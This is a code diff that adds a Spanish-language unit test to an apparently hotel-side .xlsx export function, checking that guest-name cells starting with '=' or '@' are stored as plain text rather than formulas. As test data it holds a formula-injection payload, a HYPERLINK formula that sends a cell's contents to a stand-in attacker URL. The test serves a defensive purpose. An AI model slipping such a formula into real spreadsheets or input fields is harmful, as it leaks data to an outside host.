@@ -137,6 +137,26 @@ describe("el .xlsx que se lleva el hotelero", () => {
   it("un libro sin hojas es un error, no un archivo que Excel rechaza", () => {
     expect(() => construirXlsx([])).toThrow();
   });
+
+  it("una celda que empieza por `=` es TEXTO, no una fórmula", () => {
+    // El mismo ataque que en el CSV del CRM (K-18.5): el nombre del huésped lo
+    // escribe cualquiera que reserve. Aquí no hace falta neutralizar nada porque
+    // en un .xlsx la fórmula es un elemento `<f>` aparte y estas celdas se
+    // escriben como `inlineStr`, que Excel sólo puede leer como texto. La prueba
+    // existe para que siga siendo así si algún día se toca `celdaXml`.
+    const xml = abrirZip(
+      construirXlsx([
+        {
+          nombre: "X",
+          encabezados: ["Huésped"],
+          filas: [['=HYPERLINK("https://malo/?f="&A1,"Ver")'], ["@SUM(A1:A9)"]],
+        },
+      ]),
+    )["xl/worksheets/sheet1.xml"];
+    expect(xml).not.toContain("<f>");
+    expect(xml).toContain("t=\"inlineStr\"");
+    expect(xml).toContain("=HYPERLINK");
+  });
 });
 
 describe("columna", () => {
